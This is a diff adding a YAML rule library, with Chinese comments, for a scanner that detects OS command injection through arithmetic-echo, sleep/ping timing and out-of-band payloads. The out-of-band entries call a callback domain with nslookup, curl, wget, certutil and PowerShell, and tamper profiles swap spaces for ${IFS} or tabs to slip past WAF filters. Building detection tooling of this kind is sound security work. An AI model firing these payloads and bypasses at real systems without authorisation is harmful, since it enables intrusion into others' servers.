@@ -1,0 +1,145 @@
+# 命令注入（OS Command Injection）规则库。
+#
+# 这个文件只放“检测用什么 payload、怎么识别命中”，不放调度逻辑。
+# rules.py 是很薄的加载器，把 {value} {a} {b} {delay} {ping_count} {domain}
+# 这些占位符替换成实际值。
+#
+# 设计目标：覆盖面广、通用性强、检出率高，同时把误报压到最低。
+#
+# 【绕过写法】基础 payload 保持“干净”（正常空格），空格绕过（${IFS} / $IFS$9 / Tab /
+#   ${IFS%??} 替空格，处理后端过滤空格）不写进基础 payload，而是作为独立的 tamper 阶段：
+#   原始 payload 被 WAF 拦截、或开启 deep_tamper 且未命中时，才按 tamper_profiles 追发变形。
+#   这样基础 payload 数量可控，绕过按需触发。tamper 定义见本文件末尾 + tamper.py。
+#
+# 三类检测方式（在报告里统一归为一种漏洞“命令执行”，用证据里的“检测方式”区分）：
+#   1. echo_templates —— 算术回显型。把“算出唯一乘积”的表达式拼进参数，只有目标真的
+#      执行命令并回显，响应里才会出现乘积；参数反射只会回显算式本身（不含乘积），
+#      因此能天然区分“命令执行”和“普通反射”，误报极低。
+#   2. time_templates —— 时间盲注型。sleep/ping/timeout 成对(control/delay) + 二次确认，
+#      覆盖无回显盲打。
+#   3. oob_templates —— 带外型。注入向唯一子域发起 DNS/HTTP 的命令，目标回连即确认，
+#      覆盖完全无回显、无延时的盲打（对接 interactsh，见 oob.py）。
+#
+# os 字段：unix / windows / any。识别出目标 OS 后按 os 裁剪 payload，减少无效请求。
+
+# 时间盲注延时秒数。ping 次数会按 delay 自动推算（每次 ping 约 1 秒）。
+time_delay: 5
+
+# 判定命中的最小延时差（秒）。delay 比 control 至少慢这么多才算可疑，随后还会二次确认。
+time_threshold: 3
+
+# ---------------------------------------------------------------------------
+# 算术回显型 payload。
+# {a} {b} 是运行时随机整数，{product}=a*b 由扫描器在响应里查找（不出现在 payload 中）。
+# 基础 payload（正常空格）；空格绕过由 tamper 阶段按需追加，不在这里展开。
+# ---------------------------------------------------------------------------
+echo_templates:
+  # --- Unix：命令替换上下文（结果直接并入参数值，最易被回显）---
+  - { name: unix_arith_subshell,   os: unix,    template: '{value}$(({a}*{b}))' }
+  - { name: unix_arith_replace,    os: unix,    template: '$(({a}*{b}))' }
+  - { name: unix_expr_dollar,      os: unix,    template: '{value}$(expr {a} \* {b})' }
+  - { name: unix_expr_backtick,    os: unix,    template: '{value}`expr {a} \* {b}`' }
+  - { name: unix_expr_replace,     os: unix,    template: '`expr {a} \* {b}`' }
+  # --- Unix：分隔符追加（依赖命令 stdout 被回显，如 ping 结果页）---
+  - { name: unix_semicolon_expr,   os: unix,    template: '{value};expr {a} \* {b}' }
+  - { name: unix_pipe_expr,        os: unix,    template: '{value}|expr {a} \* {b}' }
+  - { name: unix_and_expr,         os: unix,    template: '{value}&&expr {a} \* {b}' }
+  - { name: unix_newline_expr,     os: unix,    template: '{value}%0aexpr {a} \* {b}' }
+  # --- Unix：引号逃逸（参数落在 '...' 或 "..." 中）---
+  - { name: unix_squote_subshell,  os: unix,    template: "{value}'$(({a}*{b}))'" }
+  - { name: unix_dquote_subshell,  os: unix,    template: '{value}"$(({a}*{b}))"' }
+  - { name: unix_squote_expr,      os: unix,    template: "{value}';expr {a} \\* {b};'" }
+  - { name: unix_dquote_expr,      os: unix,    template: '{value}";expr {a} \* {b};"' }
+  # --- Windows ---
+  - { name: win_amp_set,           os: windows, template: '{value}&set /a {a}*{b}' }
+  - { name: win_pipe_set,          os: windows, template: '{value}|set /a {a}*{b}' }
+  - { name: win_and_set,           os: windows, template: '{value}&&set /a {a}*{b}' }
+  - { name: win_newline_set,       os: windows, template: '{value}%0aset /a {a}*{b}' }
+  - { name: win_dquote_set,        os: windows, template: '{value}"&set /a {a}*{b}' }
+
+# 保证乘积不在 baseline 里、且足够长（约 7~8 位）。
+echo_random_min: 1000
+echo_random_max: 99999
+
+# ---------------------------------------------------------------------------
+# 时间盲注 payload（成对：control 不延时，delay 延时 {delay} 秒）。
+# {ping_count} 由 rules.py 按 delay 推算。基础 payload；空格绕过由 tamper 阶段按需追加。
+# ---------------------------------------------------------------------------
+time_templates:
+  # --- Unix: sleep ---
+  - { name: unix_semicolon_sleep, os: unix,    control: '{value};sleep 0',        delay: '{value};sleep {delay}' }
+  - { name: unix_pipe_sleep,      os: unix,    control: '{value}|sleep 0',        delay: '{value}|sleep {delay}' }
+  - { name: unix_and_sleep,       os: unix,    control: '{value}&&sleep 0',       delay: '{value}&&sleep {delay}' }
+  - { name: unix_subshell_sleep,  os: unix,    control: '{value}$(sleep 0)',      delay: '{value}$(sleep {delay})' }
+  - { name: unix_backtick_sleep,  os: unix,    control: '{value}`sleep 0`',       delay: '{value}`sleep {delay}`' }
+  - { name: unix_newline_sleep,   os: unix,    control: '{value}%0asleep 0',      delay: '{value}%0asleep {delay}' }
+  - { name: unix_squote_sleep,    os: unix,    control: "{value}';sleep 0;'",     delay: "{value}';sleep {delay};'" }
+  - { name: unix_dquote_sleep,    os: unix,    control: '{value}";sleep 0;"',     delay: '{value}";sleep {delay};"' }
+  - { name: unix_replace_sleep,   os: unix,    control: '$(sleep 0)',             delay: '$(sleep {delay})' }
+  # --- Unix: ping（sleep 被禁时的备选）---
+  - { name: unix_semicolon_ping,  os: unix,    control: '{value};ping -c 1 127.0.0.1',  delay: '{value};ping -c {ping_count} 127.0.0.1' }
+  # --- Windows: ping / timeout / powershell ---
+  - { name: win_amp_ping,         os: windows, control: '{value}&ping -n 1 127.0.0.1',  delay: '{value}&ping -n {ping_count} 127.0.0.1' }
+  - { name: win_pipe_ping,        os: windows, control: '{value}|ping -n 1 127.0.0.1',  delay: '{value}|ping -n {ping_count} 127.0.0.1' }
+  - { name: win_and_timeout,      os: windows, control: '{value}&&timeout /t 0',        delay: '{value}&&timeout /t {delay}' }
+  - { name: win_amp_powershell,   os: windows, control: '{value}&powershell -c Start-Sleep 0', delay: '{value}&powershell -c Start-Sleep {delay}' }
+
+# ---------------------------------------------------------------------------
+# OOB（带外）payload。{domain} 是 interactsh 分配的唯一子域，目标执行后会回连。
+# 命中判定完全靠 OOB 服务器收到的回连（DNS/HTTP），与响应内容无关。
+# 基础 payload；空格绕过由 tamper 阶段按需追加。
+# ---------------------------------------------------------------------------
+oob_templates:
+  # --- Unix ---
+  - { name: unix_semicolon_nslookup, os: unix,    template: '{value};nslookup {domain}' }
+  - { name: unix_and_nslookup,       os: unix,    template: '{value}&&nslookup {domain}' }
+  - { name: unix_pipe_curl,          os: unix,    template: '{value}|curl {domain}' }
+  - { name: unix_semicolon_curl,     os: unix,    template: '{value};curl http://{domain}/' }
+  - { name: unix_semicolon_wget,     os: unix,    template: '{value};wget -q -O- {domain}' }
+  - { name: unix_subshell_nslookup,  os: unix,    template: '{value}$(nslookup {domain})' }
+  - { name: unix_backtick_nslookup,  os: unix,    template: '{value}`nslookup {domain}`' }
+  - { name: unix_newline_curl,       os: unix,    template: '{value}%0acurl {domain}' }
+  - { name: unix_dquote_nslookup,    os: unix,    template: '{value}";nslookup {domain};"' }
+  - { name: unix_squote_nslookup,    os: unix,    template: "{value}';nslookup {domain};'" }
+  - { name: unix_replace_curl,       os: unix,    template: 'http://{domain}/' }
+  # --- Windows ---
+  - { name: win_amp_nslookup,        os: windows, template: '{value}&nslookup {domain}' }
+  - { name: win_pipe_nslookup,       os: windows, template: '{value}|nslookup {domain}' }
+  - { name: win_and_certutil,        os: windows, template: '{value}&&certutil -urlcache -f http://{domain}/ x' }
+  - { name: win_amp_powershell,      os: windows, template: '{value}&powershell -c "Invoke-WebRequest http://{domain}/"' }
+
+# ---------------------------------------------------------------------------
+# WAF / 拦截页识别。命中后原始 payload 会尝试 tamper 变形绕过。结构和 SQL 插件一致。
+# ---------------------------------------------------------------------------
+waf_detection:
+  status_codes: [403, 406, 429, 501, 999]
+  header_keywords:
+    - x-waf
+    - waf
+    - cloudflare
+    - x-sucuri-id
+    - incapsula
+    - x-denied-reason
+  body_keywords:
+    - waf
+    - forbidden
+    - access denied
+    - blocked
+    - security policy
+    - not acceptable
+    - 拦截
+    - 非法请求
+    - 已被防火墙
+    - 安全防护
+
+# 单个 payload 被 WAF 拦截时，最多尝试多少个 tamper 变形。
+max_tampered_payloads_per_probe: 3
+
+# tamper 变形策略。tampers 是 tamper.py 里的函数名，按顺序叠加。
+# 命令注入的绕过重点是“空格过滤”：把空格换成 shell 里的等价字段分隔符。
+# places 限定适用的参数位置（Tab 不适合塞进 Cookie）。
+tamper_profiles:
+  - { name: space2ifs,    tampers: [space2ifs] }
+  - { name: space2ifs9,   tampers: [space2ifs9] }
+  - { name: space2tab,    tampers: [space2tab],  places: [query, form, json] }
+  - { name: space2brace,  tampers: [space2brace] }
